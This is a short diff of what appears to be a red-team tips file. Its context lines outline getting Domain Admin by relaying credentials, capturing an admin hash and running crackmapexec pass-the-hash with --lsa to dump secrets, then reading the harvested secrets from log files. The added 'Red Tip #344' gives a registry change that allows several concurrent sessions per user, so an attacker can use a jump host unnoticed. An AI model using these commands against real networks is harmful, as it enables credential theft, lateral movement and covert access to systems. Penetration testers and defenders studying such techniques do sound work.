@@ -21,3 +21,8 @@ How I got Domain Admin today. Relay creds>SAM dump>PTH> read cleartxt
 3) Wait for admin hash (500)
 4) cme smb <CIDR> -u username -H NTHASH --lsa
 5) cat /root/.cme/logs/*.secrets |sort -u
+
+
+
+
+Red Tip #344: Set HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0, to allow multiple sessions on a server per user. This is useful if you want to login to the jump-host, but that guy's just on all-day-long...
